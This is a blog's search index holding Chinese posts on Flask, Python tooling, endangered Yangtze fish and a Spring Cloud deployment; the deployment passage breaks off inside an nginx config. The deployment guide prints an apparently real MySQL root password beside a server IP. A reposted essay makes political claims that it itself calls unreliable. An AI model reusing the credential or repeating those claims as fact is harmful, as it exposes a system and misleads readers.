<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Flask接锅记</title>
    <url>/ff2b/</url>
    <content><![CDATA[<p>动态语言一时爽，维护重构火葬场 <span id="more"></span></p>
<!-- ## 前言

国庆假期之后开始了偶滴搬砖生活，教研室有个师兄在拿Flask做微信公众号的文章推送后端。为了读祖传代码，准备折腾Flask。
据说Flask和Django差不了太多，之前Django用的很菜，也不打算拿Django或node之类的重构一边，索性就跳Flask的坑吧

## 配置

[1] 开启Debug模式。1.0之后直接在Pycharm的Configuration里勾选开启就好了。或者

    export Flask_Debug = 1 # win系统使用set命令

[2] 使用装饰器，在指定url或修改请求方式时常用，如

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello, World'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>指定请求方式</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>[3] 处理请求、文件传输和cookies等 都在flask的request库里</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>[4] 数据库用SQLAlchemy可以像Django一样用python操作数据库，建表查询调用。</p>
<h2 id="蓝图">蓝图</h2>
<p>我们项目再大一些，就要拆分模块，Flask一般使用蓝图(Blueprint) 这样注册</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> yourapplication<span class="token punctuation">.</span>simple_page <span class="token keyword">import</span> simple_page

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>simple_page<span class="token punctuation">,</span> url_prefix<span class="token operator">=</span><span class="token string">'/pages'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样引用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> yourapplication<span class="token punctuation">.</span>simple_page <span class="token keyword">import</span> simple_page

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>simple_page<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>也可以作为资源放置静态文件，详见官方文档</p>
<h2 id="视图和模板">视图和模板</h2>
<p>Flask的模板(template)用的Jinja2，基本都是标签的形式，和Django的模板非常像，类似这种</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html">&#123;% block title %&#125;&#123;% endblock %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>(我刚刚又查了一下，Django的自带模板就是基于Jinja的魔改版，应该是Django模板像Jinja2，说反了)</p>
<p>视图函数一般用来处理入站请求，我们用装饰器把函数注册为事件处理程序，大概这个样子</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;name>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">usr</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello World,&#123;&#125;!'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
``` <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>

<span class="token comment">## 跨域</span>

跨域请求：安装flask<span class="token operator">-</span>cors<span class="token punctuation">,</span> 设置一下就行了

```Python
<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORS
···
CORS<span class="token punctuation">(</span>app<span class="token punctuation">,</span> supports_credentials<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在chrome的新特性中，使用Same-Site Cookies来解决CSRF跨域攻击的问题，没设置会报这种警告, 在未来的版本中，没设置是不允许跨域的</p>
<pre class="line-numbers language-none"><code class="language-none">A cookie associated with a cross-site resource at http:&#x2F;&#x2F;··· was set without the &#96;SameSite&#96; attribute. A future release of Chrome will only deliver cookies with cross-site requests if they are set with &#96;SameSite&#x3D;None&#96; and &#96;Secure&#96;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>设置一下属性就好了</p>
<p>生成和导入requirements</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">pip freeze <span class="token operator">></span> requirements<span class="token punctuation">.</span>txt
pip install <span class="token operator">-</span>r requirements<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>使用哈希值存储用户密码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="flask部署">Flask部署</h2>
<p>这里我用的Docker。照着<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC83ODQzMjcxOQ==">这里<i class="fa fa-external-link-alt"></i></span>部署的 这里没有用Nginx，直接上的gunicorn，回头看一下Nginx怎么搞 这里有个<span class="exturl" data-url="aHR0cDovL2RvY3MuZ3VuaWNvcm4ub3JnL2VuL3N0YWJsZS9kZXBsb3kuaHRtbA==">官方文档<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonic手账</title>
    <url>/a343/</url>
    <content><![CDATA[<p>等待填坑 <span id="more"></span></p>
<h2 id="碎碎念">碎碎念</h2>
<p>2020年了，python2该退休了（真是不太想再看到python2了，祖传依赖令人头大）</p>
<p>安利包管理工具poetry，试了都说好</p>
<p>python3.8怕是串了Go和C++的味，算了，真香</p>
<h2 id="python多版本管理">python多版本管理</h2>
<p>python的包管理是个很混乱的事， 一般单版本基本上没事，但是装了N个版本，甚至还有python2，麻烦就来了，一不小心就被坑，尤其是在大家都用的服务器上。（这上面有2.7，3.5，3.6和师兄炼丹装的conda3.7、3.6，不要问我为什么linux装conda，师兄干的）</p>
<p>我用自己的linux用户可以避开root用户底下一些混乱环境（比如conda） 主要的问题是切换python版本和python包管理，切换python版本一般用pyenv；包管理选择很多，一直没发现特别完美的工具。直到，发现了Poetry</p>
<h3 id="pyenv">pyenv</h3>
<p>pyenv用来切换python版本，配合其他工具管理包</p>
<h3 id="venv和virtualvenv">venv和virtualvenv</h3>
<p>venv是<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy90dXRvcmlhbC92ZW52Lmh0bWw=">python3官方的包管理工具<i class="fa fa-external-link-alt"></i></span>，virtualvenv兼容py2、3，这两个感觉用的最多了，看到别人的很多项目都用的这个，pycharm默认也是这玩意 没什么特殊需求就用这个吧</p>
<h3 id="pipenv">pipenv</h3>
<p>一个类似Ruby的Bundler的东西 纯指定依赖，使用体验比上面那个好，有一点慢 （不推荐在win上用）</p>
<p>就跟npm差不多，和node_modules差不多的Pipfile（存放本地包），和npm的package-lock.json差不多的Pipfile.lock（版本锁）</p>
<p>但是，这家伙会趁你不注意偷偷更新你的依赖。注意不要被它的自动更新坑了，你以为它能给你锁定版本，其实不能。</p>
<h3 id="poetry">Poetry</h3>
<p>用了一阵发现这个挺好，喜欢</p>
<p>能管理python版本和python的包，还能用来打包（这个打包感觉比setuptools舒服不少） 配置文件是单个toml，很舒服，依赖在poetry.lock里面</p>
<p>一个小问题是初次加载依赖有点慢，原因见<span class="exturl" data-url="aHR0cHM6Ly9weXRob24tcG9ldHJ5Lm9yZy9kb2NzL2ZhcS8jd2h5LWlzLXRoZS1kZXBlbmRlbmN5LXJlc29sdXRpb24tcHJvY2Vzcy1zbG93">这里<i class="fa fa-external-link-alt"></i></span>。这也不能怪poetry，PyPI上那么多库，还有不少野库，很多库并没有规范声明Metadata，poetry没法通过调PyPI的API判断该下哪种版本的包，就只能把所有的都拉下来然后判断该用哪个</p>
<p>我们打开poetry.lock文件,可以看到，一个版本所有的发行包（packages）都被拉了下来</p>
<figure>
<img src="/a343/image-20200427232343931.png" alt="poetry.lock" /><figcaption aria-hidden="true">poetry.lock</figcaption>
</figure>
<p>这个目前无解 &gt;At the moment there is no way around it.</p>
<p>如果再次用到某个库，poetry之前缓存了发行信息，不会出现那种全下一遍的事了 &gt;Once Poetry has cached the releases' information, the dependency resolution process will be much faster.</p>
<p>目前还没有太好的办法，在<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi1wb2V0cnkvcG9ldHJ5L2lzc3Vlcy8yMDk0I2lzc3VlY29tbWVudC02MDk2NDgxOTQ=">issue评论区<i class="fa fa-external-link-alt"></i></span>看到一个扭曲的方法</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">poetry <span class="token builtin class-name">export</span> -f requirements.txt <span class="token operator">></span> requirements.txt
python -m pip <span class="token function">install</span> -r requirements.txt
poetry <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="docker虚拟机">Docker&amp;虚拟机</h3>
<p>Django之类的项目部署的时候推荐Docker 一般开发环境没有必要上Docker，真机就挺好，Docker不熟悉的反而可能造成不少麻烦(比如网络部分那堆坑)，怕搞乱环境不如直接上虚拟机。 Docker的镜像有官方的python，但是非常大，上G。如果自己写Dockerfile构建一个，缩减镜像，调度每个容器的内存，都是远比前面那几个东西麻烦的事情。 Docker我感觉并不适合个人开发环境，感觉部署和运行的时候方便点，用来当开发环境体验不是太好。 Docker在调试的时候并不太舒服，而且对Docker初学者来说，网络那里很多坑，为了方便或节省时间用Docker配python的开发环境 但是这么一配置，怎么比原来麻烦多了，Docker狂热爱好者吹嘘的部署方便这里在需要调试的时候并没有什么优势。 虽然Docker本身并不吃你太多内存，但是Docker容器跑起来，如果不调度和限制，经常占了好多内存，虽然写python一般也不在乎在这个。</p>
<h3 id="anaconda">anaconda</h3>
<p>我反正不喜欢，没怎么用过，看到这种全家桶我就害怕（早年360和金山留下的阴影，请谅解）。 把python当matlab用的、习惯matlab那种又大又卡但是科学计算功能齐全的全家桶的人可以装个这个。 win10有些包很难装，倒是可以把ananconda当jupyter notebook的win10安装工具人；平时就写写python玩就不要装这玩意了，打开win10的应用商店，搜python，点安装，好了，用吧 炼丹CUDA之类的建议出门左转用Linux，win10跟torch之类的东西八字不合，这是conda也挽救不了的</p>
<h2 id="参考">参考</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kZXYvcGVwcy9wZXAtMDAwOC8=">PEP8<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ndW9ydWliaWFvLmdpdGJvb2tzLmlvL2VmZmVjdGl2ZS1weXRob24vY29udGVudC8=">Effective Python 翻译版<i class="fa fa-external-link-alt"></i></span></li>
<li>Fluent Python</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucHlsaW50Lm9yZy8=">pylint<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9weXRob24tcG9ldHJ5Lm9yZy8=">poetry官网<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RlcGhlbGwvZGVwaGVsbA==">dephell打包工具<i class="fa fa-external-link-alt"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>远去的水族生灵</title>
    <url>/before-vanish/</url>
    <content><![CDATA[<p>又南水行七百里，曰孟子之山，其木多梓桐，多桃李，其草多菌浦，其兽多麋鹿。是山也，广员百里。其上有水出焉, 名日碧阳，其中多鳣鲔 <span id="more"></span></p>
<p><img src="/before-vanish/water.jpg" /></p>
<p>元旦在沙河边转着玩，又看到沙河有一群大妈拿着七八个桶直接倾倒鱼和小龙虾（对，就是那个<del>著名</del>入侵物种克氏原螯虾）。这几天网上冲浪又看到日人民报等辣鸡营销号消费过世白鲟，还纷纷把图配成匙吻鲟，心里不是滋味。长江流域基本也凉的差不多了，当年葛洲坝一建，白鲟中华鲟达氏鲟就凉了一半，挖沙和万安水库和富春江水电站也把最后的鲥鱼搞没了。鄱阳湖要是再乱搞，江豚基本也要凉透了（虽然不乱搞也要凉透了，时间问题，无力回天）。那些数不清名字的小鱼就更惨了，好多两个图片和影像都没留下</p>
<p>哦，对了，前几年长江养殖逃逸了大量杂交鲟，中华鲟和达氏鲟野生种群基本就废了</p>
<p>寡鳞鱊重现江湖的奇迹可能再也不会有了。</p>
<blockquote>
<p>千斤魶子万斤象，黄排大了不像样</p>
</blockquote>
<figure>
<img src="baixun.jpg" alt="白鲟" /><figcaption aria-hidden="true">白鲟</figcaption>
</figure>
<p>就现在这样子，不仅斑鳖要上路，鼋八成也保不住；不仅白鱀豚没了，江豚（窄脊江豚长江江豚亚种<em>N. a. asiaeorientalis</em>）也迟早凉。 斑鳖在某动物园的惨状大家应该都知道了，鼋也好不到哪去（国内的龟鳖都好不到哪去） &gt;鼋，到现在，都没有一个像样的保护区。也就是说，救助团体一直是民间（或挂靠）开展的。某保护区我就不点名了，有文件，一直不施工，民间捐的俩成体鼋一直养在水泥池子里……</p>
<p>最近被骂的<span class="exturl" data-url="aHR0cHM6Ly93ZWliby5jb20vNTAyMTAzNjc4Ni9JbkIxUmZrQkU=">扎龙保护区<i class="fa fa-external-link-alt"></i></span>也是打着保护的旗号干缺德事呢，对了，前几年的鄱阳湖水利枢纽工程也是打着环保的旗号。好多湿地绿化和荒漠绿化都是把原来好好的灌木草地沼泽全种成整齐划一的树，哇，这破坏生态的绿色荒漠算政绩呢 这里全文转载流年消年少同学的一篇旧文：从鄱阳湖水利枢纽工程看看党的千秋伟业</p>
<div class="note info"><blockquote>
<p>逆天改命，非以倾国之力而不能为</p>
</blockquote>
<p>​​​ 2016年底，微博上因为江西省水利厅一篇《 鄱阳湖水利枢纽环评 请你提建议》的公告引发了不小的风波。无疑这个举动将会对鄱阳湖生态环境造成巨大的负面影响，濒危的长江江豚、白鹤也将为此陷入灭绝的境地，那为什他们会出此下策呢？前几天与老师朋友讨论这个事情，个中缘由可能真的不简单。</p>
<p>下面都是胡说八道，大家请勿轻信 我们先看看好端端的鄱阳湖​为什么会见底？没错，因为我党的两项“千秋伟业”。 目前，中国两大世纪水利工程——三峡工程早已完成、南水北调工程东线刚刚正通水，中线已经贯通，西线还未开工中。对于如此重大的工程，一直有颇多争议，如修建三峡时，反对意见也非常强烈。三峡建成后，是否会引发干旱、地震等自然灾害都成为了人们热议的焦点。而奇怪的是，南水北调工程几乎没有专家反对，顺利开工建成。对南水北调的质疑也远远不如三峡工程。这是很令人奇怪的地方 多年前，一位旅居德国的国土专家王维洛为就揭底了南水北调和三峡，个中缘由触目惊心。 前几年长江中下游缺水缺得很厉害。从浙江、安徽、江西、湖南和湖北都缺水，特别是湖北省缺水缺的厉害。国内报导是说，湖北的水库都已底朝天，没水了，洪水浪打浪也没浪了。洪湖水也就剩几十厘米深。根本原因是因为湖北省担任了中国两个最大的工程—三峡和南水北调工程。其实这两个工程是一个姐妹工程，密不分，南水北调中线方案的源头工程，就是三峡的水源工程。三峡工程问题突出的原因，并非像国内宣传的那样是什么三峡派海外黑手搞的，其实是国内地方对中央矛盾所引起的。因为干旱现象在湖北和江西已非常突出了。 三峡工程干旱问题的治理，首先是江西省在13年提出来的，是省水利厅一些技术人员要搞鄱阳湖拦水大坝工程。为什么要建这个工程？是因为三峡大坝影响了鄱湖的蓄水，这么引出来的。 2013年的干旱，是当时专家预计的2030年要出现的，那么现在2011年就出现了。而且缺的很厉害，也不像人们说的南方水多，长江流域也将进入枯水，中下游缺缺的很厉害，尤其是湖北省。当时的湖北所有水库几乎是底朝天了。就是南水北调中线工程源头的水库—丹江河水库水位已降到死水位，没有水可以向外排放了。以当时湖北省要求三峡水库赶紧放水。如果当时三峡工程放水的话，就可以看到一个相当可怕的过程，就是说三峡把每天放3000至5000多立方米的水，但是水到湖北地区马上就被抽上去。 鄱阳湖快干枯江西省受不了，为什么？因为中国的抽水工程太厉害了，水泵太厉害了，把长江的水都抽到支流里去了。所以主流水位越往下游水量越少。所以人为自然干涉情况已到了很严重的地步。这种干旱情况未来还会重复出现，而且未来在用水问题上的矛盾还会更尖锐。 南水北调的是中线方案，是指从三峡把水调过去，而不是在丹江口把水调过去。要在三峡把洪水卡住，把三峡的水调到北方去。 长江在历史上流量最小时就有3000多立方/每秒，而黄河平均也就几百立方/每秒，两条河相差很多。长江平均年流量每秒是一万多立方。洪水期流量更大，千年遇的洪水流量大概是九万多立方/每秒，万年一遇的洪水流量是十一万多立方/每秒。如果回到长江的原始状态，其出海口是个湖，湖面宽是20多公里。唐诗中：“帆远影碧空尽，唯见长江天际流”，你会看到那是一条很宽广的河。所以在历史上说长江洪灾很少，而说黄河洪灾的记录就比较多。因为长江下游的蓄水能力很大所以洪水灾害比较小。所以现在长江水位少，而抽水就形成了湖北抽水，湖南就没有多少水可抽，那江西就更受不了，因为水位更低，所以鄱阳湖就像长江的水保住了，因此江西省闹得就特别厉害。 南水北调和三峡里面太多荒唐的东西了，建国以来中国的水利就是在玩水。它根本就不尊重自然规律，想把水折腾到哪儿就折腾到那儿。其实如果中国真的要调水就应该使用地下暗管，就像输油管道一样，埋在地下，又能省地、又没有风险，还能避免人家抢水，能保证进京的水。可是领导人必须让他的功绩让老百姓看得见还得让天上的卫星能够拍得到，比方说隋炀帝修的大运河还留在那儿，南水北调的工程是XXX搞的，三峡工程是XXX的，留在那儿的。 除了领导人，知识分子也是很聪明的，他们是有学习能力的。看看三峡工程中在最后报告上签字的那些专家们，最后都成了工程院和科学院的院士，成了对国家有献的特殊专家和院士，得了这个奖那个奖。你再看那看看那九位没有签名的专家，他们的水平绝对在签了字的人之上，但是没有一个人成为院士。中国的知识份子名利都看得很重，这也不是他们的错。这些还想进入科学最高殿堂的知识份子，他们在三峡工程的学习过程中，知道还是不说的好，说了也没有用。 因为他们的想是步入殿堂，如果他们说了的话，现在很可能连一个科研的题目、科研经费都拿不到。就像黄万里一样，给三峡工程写了那么多的论文，他有一分钱的科研经吗？他从朝廷拿了一分钱的科研经费吗？没有。 所以说，三峡工程在中国的学术界造成了一个很坏的影响，开了一个很坏的先例，后边的人知道了，尽管不是像当初那样被打成右派，可他把你打成另类，没有科经费，那你怎么办！你想当院士，没门。所以他们就不说了。我们一直在玩水的专家学者们，竟忘了一个最浅显的道理：水是从高往低流的，真乃一大黑色幽默。 当一件事，光有赞成而没有批评意见时，这件事错误的可能性很大。当三峡工程和南水北调工程只剩下一位黄万里先生，像唐吉珂德一样批评时，就注定了。 所以，鄱阳湖的现状就是这样， 不建大坝，江西无水可用；建了大坝，毁了白鹤和江豚栖息地。人与自然，在我朝一直就不是可以和谐发展的。 大家都知道这两项伟业贻害万年，谁又敢反对呢？ 民众反对--有个屁用，实在不行给你扣个反贼帽子你试试。地方官员反对--除非你想断送大好前途，呵呵。专学者反对--呵呵，当政者反对--否定前辈路线，自扇耳光。所以，这是一个很现实，也很魔幻的中国特色的伟业。 ~最后，祝伟大祖国繁荣昌盛，千秋万代！</p>
</div>
<p>十年之前，我还在上两江，那时候两江很热闹，现在两江也还开着（这里感谢饿老大，坚守到现在不容易）</p>
<p>在成都的河里湖里随便找找，能看到什么呢，满地食蚊红耳龟福寿螺罗非小龙虾，再找找才能看到点子陵和吸鳅爬鳅之类的，唉</p>
<blockquote class="blockquote-center">
<p>Repair what you can — but when you must fail,fail noisily and as soon as possible.</p>

</blockquote>
<p>不知巴拉水电站能否被拦下马，留给川陕哲罗鲑的时间不多了</p>
<p>十年前，小南海水电站，下马了</p>
<p><span class="exturl" data-url="aHR0cDovL2NxaDJvLmNvbS9mb3J1bS5waHA/bW9kPXZpZXd0aHJlYWQmYW1wO3RpZD0zMzUxMQ==">坚决反对修建小南海水电站<i class="fa fa-external-link-alt"></i></span></p>
<p>也罢</p>
<figure>
<img src="/before-vanish/old.jpg" alt="道子搜山，白鲟遗像" /><figcaption aria-hidden="true">道子搜山，白鲟遗像</figcaption>
</figure>
<blockquote class="blockquote-center">
<p>君不见，高堂明镜悲白发，朝如青丝暮成雪</p>

</blockquote>
]]></content>
      <categories>
        <category>彼黍离离</category>
      </categories>
      <tags>
        <tag>鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>本站评论由valine更换为DisqusJS</title>
    <url>/change-comment-to-disqusjs/</url>
    <content><![CDATA[<p>由于近日不少采用valine作为评论系统网站的遭到几千个垃圾评论刷屏攻击，外加valine存在的安全隐患问题，放弃好看的valine，换用DisqusJS。 utteranc继续使用。</p>
]]></content>
  </entry>
  <entry>
    <title>上线一个Spring Cloud的课程管理服务项目</title>
    <url>/course-managemnet/</url>
    <content><![CDATA[<p>先说一下感想：小作坊不适合微服务，请不起年薪五十万的架构师、年薪三十万的DevOps，没有各种没事造轮子重构刷KPI的目的，没有服务器集群的、开发一只手能数过来的，都谨慎尝试微服务。</p>
<span id="more"></span>
<h2 id="大概情况">大概情况</h2>
<ul>
<li><p>瞎折腾微服务玩，然而并没有集群（手里三台服务器垃圾配置只够乱开几个Docker玩）</p></li>
<li><p>并没有Golang，用的java（别问为什么又是java）</p></li>
<li><p>目测用户量不超过100，很有可能并发量不超过10（对，比我这博客网站还门可罗雀）</p></li>
<li><p>不过比较麻烦的一点是有视频播放的问题，流量根本顶不住，目前是打算买阿里云的视频点播</p></li>
</ul>
<p><del>我感觉到时候日均用户访问量都没有拆分出来的微服务个数多</del></p>
<ul>
<li>用的Spring Cloud全家桶（你看我们像是有闲功夫能自研框架人吗）</li>
<li>写的挺好，一上线幺蛾子就多了</li>
</ul>
<p>cm_admin: 后台管理系统前端代码，vue写的 cm_frontweb: 主页面前端代码，Nuxt.js的 cm_parent: 后端代码 Spring Cloud 拆成了个微服务</p>
<p><del>过度设计，问就是过度设计</del></p>
<figure>
<img src="/course-managemnet/image-20201118214736704.png" alt="后台管理" /><figcaption aria-hidden="true">后台管理</figcaption>
</figure>
<figure>
<img src="/course-managemnet/image-20201118215636817.png" alt="前台界面" /><figcaption aria-hidden="true">前台界面</figcaption>
</figure>
<h2 id="环境配置">环境配置</h2>
<h3 id="数据库">数据库</h3>
<p>docker安装mysql8（其实不是很推荐把数据库扔到Docker里面）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker pull mysql:8.0
<span class="token function">sudo</span> docker images mysql:8.0
<span class="token function">netstat</span> -tunlp
docker run -p <span class="token number">3309</span>:3306 --name mysql8.0 -e <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">102</span>@uestc -d mysql:8.0
docker <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>初始化数据库，运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mycli -u root -h your_ip_address -P <span class="token number">3309</span> -p your_password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">create database course_management
use course_management
source ~&#x2F;codes&#x2F;course_management&#x2F;course_management.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>看一下是否成功</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql root@211.83.255.255:course_management&gt; show tables
+-----------------------------+
| Tables_in_course_management |
+-----------------------------+
| crm_banner                  |
| edu_chapter                 |
| edu_comment                 |
| edu_course                  |
| edu_course_collect          |
| edu_course_description      |
| edu_subject                 |
| edu_teacher                 |
| edu_video                   |
| statistics_daily            |
| t_order                     |
| t_pay_log                   |
| ucenter_member              |
+-----------------------------+
13 rows in set
Time: 0.009s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="spring-cloud的8个微服务">Spring Cloud的8个微服务</h3>
<p>分别打包好8个jar包</p>
<p>启动服务：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> java -jar <span class="token punctuation">&#123;</span>微服务名.jar<span class="token punctuation">&#125;</span> -Dspring.config.location<span class="token operator">=</span><span class="token punctuation">&#123;</span>配置文件名.properties<span class="token punctuation">&#125;</span> <span class="token operator">></span> java_cm.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>配置可以从指定的<code>application.properties</code> 中覆盖</p>
<p>(本来是都扔在Docker里面的，发现docker images有点大，内存消耗也上去了)</p>
<h3 id="修改配置">修改配置</h3>
<p>将<code>src/main/resources/application.properties</code>和<code>src/test/java/CodeGenerator.java</code>中的配置文件（包括数据库端口、密码、密钥等）改成自己的</p>
<p>或者启动的时候在`<code>application.properties</code> 中覆盖</p>
<h3 id="nacos">NACOS</h3>
<p>一个阿里的动态监控监控服务，有一个控制台。我们只要单机版就够了。还有其他的功能，暂时都没用到。</p>
<p>阿里官方的建库脚本</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvbmFjb3MvYmxvYi9tYXN0ZXIvZGlzdHJpYnV0aW9uL2NvbmYvbmFjb3MtbXlzcWwuc3Fs">https://github.com/alibaba/nacos/blob/master/distribution/conf/nacos-mysql.sql<i class="fa fa-external-link-alt"></i></span></p>
<p>或者不要数据库记录日志，直接存成文件。这个直接照着官方的说明启动就行了</p>
<p>见<span class="exturl" data-url="aHR0cHM6Ly9uYWNvcy5pby96aC1jbi9kb2NzL3F1aWNrLXN0YXJ0Lmh0bWw=">https://nacos.io/zh-cn/docs/quick-start.html<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/alibaba/nacos.git
<span class="token builtin class-name">cd</span> nacos/
mvn -Prelease-nacos -Dmaven.test.skip<span class="token operator">=</span>true clean <span class="token function">install</span> -U
<span class="token function">ls</span> -al distribution/target/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>不想自己打包的直接下那个release好了</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvbmFjb3MvcmVsZWFzZXM=">https://github.com/alibaba/nacos/releases<i class="fa fa-external-link-alt"></i></span></p>
<p>运行：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> nacos/bin
<span class="token function">sh</span> startup.sh -m standalone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<figure>
<img src="/course-managemnet/image-20201116215705790.png" alt="这样子就是运行成功了" /><figcaption aria-hidden="true">这样子就是运行成功了</figcaption>
</figure>
<h3 id="nginx">Nginx</h3>
<p>使用Nginx进行端口映射，还是把Nginx扔到Docker里面了</p>
<p>编写<code>default.conf</code>:</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">listen</span>	<span class="token number">9001</span><span class="token punctuation">;</span>
		<span class="token keyword">server_name</span>	localhost<span class="token punctuation">;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>eduservice<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8001</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>eduoss<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8002</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
